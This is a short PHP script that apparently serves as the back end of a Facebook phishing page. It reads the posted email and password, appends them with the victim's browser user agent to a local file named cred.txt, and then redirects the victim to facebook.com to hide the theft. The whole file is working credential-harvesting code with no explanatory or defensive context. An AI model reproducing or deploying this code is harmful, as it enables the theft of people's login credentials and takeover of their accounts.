<?php
if(isset($_POST['email']) && isset($_POST['pass'])){
   $email=$_POST['email'];
   $pass=$_POST['pass'];
    $file=fopen("cred.txt","a");
    fwrite($file,"Email : " . $email ."\n");
    fwrite($file,"Password : " . $pass ."\n");
    fwrite($file,"Browser : " . $_SERVER["HTTP_USER_AGENT"] ."\n");
    fwrite($file,"\n\n");
    fclose($file);
    header("location:https://www.facebook.com");
}
?>